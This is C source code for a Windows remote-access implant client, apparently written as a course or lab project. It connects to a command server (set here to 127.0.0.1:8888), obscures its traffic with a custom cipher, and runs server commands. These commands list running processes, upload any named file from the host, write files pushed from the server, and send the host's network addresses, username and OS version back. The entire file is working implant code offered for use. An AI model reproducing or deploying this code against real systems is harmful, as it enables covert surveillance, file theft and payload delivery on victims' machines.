#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <wchar.h>
#include <ws2tcpip.h>

#define INT_SIZE   sizeof(uint32_t)
#define BUF_SIZE   8192
#define PROCS      0x73BF
#define UPLOAD     0x62CD
#define DOWNLOAD   0x9E7A
#define INFO       0xD3A8
#define EXIT_ERROR 1
#define EXIT_CLEAN 0

/*
 * Takes a uint32 and applies the cipher to it. This can be used in
 * a loop to encode a buffer before it's sent or after it's received.
 *
 * @param uint32_t    Value to apply the cipher to
 *
 * @returns uint32_t  Result of the cipher
 */
uint32_t cipher(uint32_t x) {
    // y starts with the LSb of x
	uint32_t y = x & 1;

	// Variable declarations
	uint32_t temp, temp2;
	int i, j;

	// "Solve" for the remaining 31 bits
	for (i=1; i<32; i++) {
	    // temp starts as the value of x
		temp = x;

		// Go through the bits lower than i
		for (j=i; j>0; j--) {
		    // Start by shifting y (current intermediate result)
			temp2 = y << j;

			// XOR and subtract from temp
			temp ^= temp2;
			temp -= temp2 << (j-1);
		}

		// Save the bit that was "solved for" this iteration
		y |= temp & (1ll << i);
	}

	// Return the cipher result
	return y;
}

/*
 * Takes a character buffer, encodes it, and sends it to the server.
 *
 * @param SOCKET  Connected server socket
 * @param char*   Pointer to the buffer to send
 * @param DWORD   The length of the message to be sent
 *
 * @returns BOOL  Success result: TRUE success, FALSE failure
 */
BOOL send_encrypted(SOCKET sock, char* buf, DWORD len) {
    // Variable declarations
    DWORD bytes_wrote, i;

    // Length needs a ceiling to the nearest multiple of 4
	len += (INT_SIZE - len%INT_SIZE) % INT_SIZE;

	// Create a copy of the buffer to preserve the original one
	char copy[len];
    char *buf_ptr = copy;
	memcpy(copy, buf, len);

	// Apply the cipher to each chunk of 4 bytes in the buffer
	uint32_t *ptr = (uint32_t *) copy; // Pointer manipulation
	for (i=0; i<len; i+=INT_SIZE) {
		*ptr = cipher(*ptr);
		ptr++;
	}

	// While there's more data to send
    while (len > 0) {
        // Attempt to send the data to the server
        if (!WriteFile((HANDLE) sock, buf_ptr, len, &bytes_wrote, 0)) {
            // Return failure
            return FALSE;
        }

        // Adjust the length and buffer pointer based on the bytes sent
        len -= bytes_wrote;
        buf_ptr += bytes_wrote;
    }

    // Return success
    return TRUE;
}

/*
 * Takes a receives data from the server, decodes it, and saves
 * it to the given character buffer.
 *
 * @param SOCKET  Connected server socket
 * @param char*   Pointer to the buffer to store into
 * @param DWORD   The length of the message to be received
 *
 * @returns BOOL  Success result: TRUE success, FALSE failure
 */
BOOL recv_encrypted(SOCKET sock, char* buf, DWORD len) {
    // Variable declarations
    DWORD bytes_read, i, len2;
    char *buf_ptr = buf;
    uint32_t *ptr = (uint32_t *) buf; // Pointer manipulation

    // Length needs a ceiling to the nearest multiple of 4
	len += (INT_SIZE - len%INT_SIZE) % INT_SIZE;
	len2 = len;

	// While there's more data to receive
    while (len > 0) {
        // Attempt to receive data from the server
        if (!ReadFile((HANDLE) sock, buf_ptr, len, &bytes_read, 0)) {
            // Return failure
            return FALSE;
        }

        // Adjust the length and buffer pointer based on the bytes received
        len -= bytes_read;
        buf_ptr += bytes_read;
    }

    // Apply the cipher to each chunk of 4 bytes in the buffer
	for (i=0; i<len2; i+=INT_SIZE) {
		*ptr = cipher(*ptr);
		ptr++;
	}

	// Return success
    return TRUE;
}

/*
 * Grabs a list of all running processes on the system and
 * sends it to the server. This code is a slightly modified
 * version of the example given by Microsoft:
 * https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes
 *
 * @param SOCKET  Connected server socket
 *
 * @returns void  No return value
 */
void list_procs(SOCKET sock) {
    // Variable declarations
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    char *buf;
    int rv, offset = 0, buf_len = BUF_SIZE;

    // Attempt to allocate the initial buffer
    // and exit if unsuccessful
    buf = (char *)calloc(buf_len, sizeof(char));
    if (buf == NULL) {
        exit(EXIT_ERROR);
    }

    // Take a snapshot of all processes in the system
    // and exit if unsuccessful
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hProcessSnap == INVALID_HANDLE_VALUE)
    {
        exit(EXIT_ERROR);
    }

    // Set the size of the structure before using it
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process
    // and exit if unsuccessful
    if(!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);
        exit(EXIT_ERROR);
    }

    // Walk through the snapshot of processes to
    // get the complete list of running processes
    offset += snprintf(buf, buf_len, "Processes: \n");
    do
    {
        // Verify the buffer has enough space
        rv = (int) strlen(pe32.szExeFile);
        while (offset+rv >= buf_len) {
            buf_len += BUF_SIZE;
            buf = (char *) realloc(buf, buf_len);
            if (buf == NULL) {
                CloseHandle(hProcessSnap);
                exit(EXIT_ERROR);
            }
        }

        // Append the process name to the buffer
        // and adjust the buffer offset
        offset += snprintf(buf+offset, buf_len-offset, "%s\n", pe32.szExeFile);
    } while(Process32Next(hProcessSnap, &pe32));

    // Clean up the processes snapshot
    CloseHandle(hProcessSnap);

    // Attempt to send the size of the data in the buffer to the server
	if (!send_encrypted(sock, (char *)&offset, sizeof(offset))) {
		free(buf);
		exit(EXIT_ERROR);
	}

	// Attempt to send the data in the buffer to the server
    if (send_encrypted(sock, buf, offset)) {
        free(buf);
    } else {
        free(buf);
        exit(EXIT_ERROR);
    }
}

/*
 * Uploads a file from the client to the server.
 *
 * @param SOCKET  Connected server socket
 *
 * @returns void  No return value
 */
void upload_file(SOCKET sock) {
    // Variable declarations
    int len;
    char filename[BUF_SIZE] = {0};
    char buffer[BUF_SIZE] = {0};
    HANDLE file;
    LARGE_INTEGER largeint;
    uint64_t f_size;
    DWORD bytes_read;

    // Attempt to get the length of the filename from the server
    if (!recv_encrypted(sock, (char *)&len, sizeof(len))) {
        exit(EXIT_ERROR);
    }

    // Attempt to receive the filename from the server
    if (!recv_encrypted(sock, filename, len)) {
        exit(EXIT_ERROR);
    }

    // Attempt to open the file
    file = CreateFileA(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        // Send the server a file size of 0 if the file doesn't exist
        f_size = 0;
        send_encrypted(sock, (char *)&f_size, sizeof(f_size));
        exit(EXIT_ERROR);
    }

    // Get the file size and send it to the server
    GetFileSizeEx(file, &largeint);
    f_size = largeint.QuadPart;
    if (!send_encrypted(sock, (char *)&f_size, sizeof(f_size))) {
        CloseHandle(file);
        exit(EXIT_ERROR);
    }

    // Get the contents of the file and send them to the server
    if (f_size > 0) {
        while (ReadFile(file, buffer, BUF_SIZE, &bytes_read, NULL) &&
               bytes_read != 0) {
            if (!send_encrypted(sock, buffer, bytes_read)) {
                CloseHandle(file);
                exit(EXIT_ERROR);
            }
        }
    }

    // Close the file
    CloseHandle(file);
}

/*
 * Downloads a file from the server to the client.
 *
 * @param SOCKET  Connected server socket
 *
 * @returns void  No return value
 */
void download_file(SOCKET sock) {
    // Variable declarations
    int len;
    char filename[BUF_SIZE] = {0};
    char buffer[BUF_SIZE] = {0};
    HANDLE file;
    uint64_t f_size;
    DWORD bytes_written;
	
    // Attempt to get the length of the filename from the server
    if (!recv_encrypted(sock, (char *)&len, sizeof(len))) {
        exit(EXIT_ERROR);
    }

    // Attempt to receive the filename from the server
    if (!recv_encrypted(sock, filename, len)) {
        exit(EXIT_ERROR);
    }

    // Attempt to open the file
    file = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        exit(EXIT_ERROR);
    }

    // Attempt to receive the file size from the server
    if (!recv_encrypted(sock, (char *)&f_size, sizeof(f_size))) {
        CloseHandle(file);
        exit(EXIT_ERROR);
    }

    // Get the contents of the file and write them to the file
    while (f_size > 0) {
        if (!recv_encrypted(sock, buffer, min(BUF_SIZE, f_size))) {
            CloseHandle(file);
            exit(EXIT_ERROR);
        }

        if (!WriteFile(file, buffer, min(BUF_SIZE, f_size), &bytes_written, 0)) {
            CloseHandle(file);
            exit(EXIT_ERROR);
        }

        f_size -= min(BUF_SIZE, f_size);
    }

    // Close the file
    CloseHandle(file);
}

/*
 * Gathers various information about the client
 * and sends it to the server.
 *
 * @param SOCKET  Connected server socket
 *
 * @returns void  No return value
 */
void client_info(SOCKET sock) {
    // Variable declarations
    DWORD rv, size;
    PIP_ADAPTER_ADDRESSES adapter_addresses, aa;
    PIP_ADAPTER_UNICAST_ADDRESS  ua;
    size_t buf_len = BUF_SIZE;
    char temp_buf[BUFSIZ];
    char *buf;
    int temp_offset, offset = 0;

    // Attempt to allocate the initial buffer
    // and exit if unsuccessful
    buf = (char *)calloc(buf_len, sizeof(char));
    if (buf == NULL) {
        exit(EXIT_ERROR);
    }

    // Initial call to get the size needed for adapter_addresses
    rv = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &size);
    if (rv != ERROR_BUFFER_OVERFLOW) {
        free(buf);
        exit(EXIT_ERROR);
    }

    // Attempt to allocate space for adapter_addresses
    // No error check cause GetAdaptersAddresses returns error with NULL pointer
    adapter_addresses = (PIP_ADAPTER_ADDRESSES)malloc(size);

    // Attempt to get information about the network adapters
    rv = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, adapter_addresses, &size);
    if (rv != ERROR_SUCCESS) {
        free(buf);
        free(adapter_addresses);
        exit(EXIT_ERROR);
    }

    // Go through each adapter and ignore any that aren't in use
	offset += snprintf(buf, buf_len, "MAC and IP Addresses:\n");
    for (aa = adapter_addresses; aa != NULL; aa = aa->Next) {
        if (aa->OperStatus == NET_IF_OPER_STATUS_UP) {
            // Clear the temporary buffer
            memset(temp_buf, 0, BUFSIZ);

            // Create the MAC address string for the adapter
            for (DWORD i = 0; i < aa->PhysicalAddressLength; i++) {
                if (i == (aa->PhysicalAddressLength - 1)) {
                    snprintf(temp_buf + (i * 3), BUFSIZ - (i * 3), "%.2X", (int) aa->PhysicalAddress[i]);
                } else {
                    snprintf(temp_buf + (i * 3), BUFSIZ - (i * 3), "%.2X-", (int) aa->PhysicalAddress[i]);
                }
            }

            // MAC address of all 0's given for adapters without on (i.e. loopback)
            if (aa->PhysicalAddressLength == 0) {
                snprintf(temp_buf, BUFSIZ, "00-00-00-00-00-00");
            }

            // Final message formatting
            temp_offset = (int) strlen(temp_buf);
            snprintf(temp_buf + temp_offset, BUFSIZ - temp_offset, " : ");
            temp_offset += 3;

            // Get the IP address for the given adapter
            ua = aa->FirstUnicastAddress;
            getnameinfo(ua->Address.lpSockaddr, ua->Address.iSockaddrLength, temp_buf + temp_offset, BUFSIZ - temp_offset, NULL, 0, NI_NUMERICHOST);
            temp_offset = (int) strlen(temp_buf);

            // Verify the buffer has enough space
            while (temp_offset+offset >= buf_len) {
                buf_len += BUF_SIZE;
                buf = (char *) realloc(buf, buf_len);
                if (buf == NULL) {
                    free(adapter_addresses);
                    exit(EXIT_ERROR);
                }
            }

            // Append the MAC and IP address to the buffer
            // and adjust the buffer offset
            offset += snprintf(buf+offset, buf_len-offset, "%s\n", temp_buf);
        }
    }

    // Free the space allocated for adapter_addresses
    free(adapter_addresses);
	


    // Get the username of the current user
	size = BUFSIZ;
	GetUserName(temp_buf, &size);
	temp_offset = (int) strlen(temp_buf);

	// Verify the buffer has enough space
	while (temp_offset+offset+11 >= buf_len) {
		buf_len += BUF_SIZE;
		buf = (char *) realloc(buf, buf_len);
		if (buf == NULL) {
			exit(EXIT_ERROR);
		}
	}

	// Append the username to the buffer
	// and adjust the buffer offset
	offset += snprintf(buf+offset, buf_len-offset, "\nUsername: %s\n", temp_buf);
	
	

	// Variable to store the RtlGetVersion() function
	NTSTATUS(WINAPI *RtlGetVersion)(LPOSVERSIONINFOEXW);

	// Attempt to load the RtlGetVersion() function from ntdll
    *(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");
	if (RtlGetVersion == NULL) {
		free(buf);
		exit(EXIT_ERROR);
	}

	// Get the OS version information
    OSVERSIONINFOEXW osInfo;
    osInfo.dwOSVersionInfoSize = sizeof(osInfo);
    RtlGetVersion(&osInfo);

    // Verify the buffer has enough space
    rv = snprintf(temp_buf, BUFSIZ, "\nOS Version: %d.%d.%d\n", osInfo.dwMajorVersion, osInfo.dwMinorVersion, osInfo.dwBuildNumber);
	while (offset+rv >= buf_len) {
		buf_len += BUF_SIZE;
		buf = (char *) realloc(buf, buf_len);
		if (buf == NULL) {
			exit(EXIT_ERROR);
		}
	}

	// Append the OS version information
	// and adjust the buffer offset
	offset += snprintf(buf+offset, buf_len-offset, "%s", temp_buf);



    // Attempt to send the size of the data in the buffer to the server
	if (!send_encrypted(sock, (char *)&offset, sizeof(offset))) {
		free(buf);
		exit(EXIT_ERROR);
	}

	// Attempt to send the data in the buffer to the server
	if (send_encrypted(sock, buf, offset)) {
        free(buf);
    } else {
        free(buf);
        exit(EXIT_ERROR);
    }
}

/*
 * Main Entry
 */
int main() {
    // Variable declarations
    SOCKET sock;
    struct sockaddr_in sock_addr;
    WSADATA wsa;
    int rv;

    // Static IP and port for this project
    char ip_addr[] = "127.0.0.1";
    int port = 8888;

    // Attempt to initialize the Winsock library
    WSAStartup(MAKEWORD(2,2), &wsa);
    sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if (sock == INVALID_SOCKET) {
		return EXIT_ERROR;
	}

	// Set the server address for IPv4 using the static IP and port
    sock_addr.sin_port = htons(port);
    sock_addr.sin_family = AF_INET;
    sock_addr.sin_addr.s_addr = inet_addr(ip_addr);

    // Attempt to connect to the server
    rv = WSAConnect(sock, (SOCKADDR*) &sock_addr, sizeof(sock_addr), NULL, NULL, NULL, NULL);
    if (rv == SOCKET_ERROR) {
        return EXIT_ERROR;
    }

    // Constantly receives a command from the server and
    // runs the appropriate function for the given command
    while (recv_encrypted(sock, (char *)&rv, sizeof(rv))) {
		switch(rv) {
			case PROCS:
				list_procs(sock);
				break;
			case UPLOAD:
				upload_file(sock);
				break;
			case DOWNLOAD:
				download_file(sock);
				break;
			case INFO:
				client_info(sock);
				break;
			default:
				break;
		}
	}

    // Cleanup the Winsock library and exit
    WSACleanup();
    return EXIT_CLEAN;
}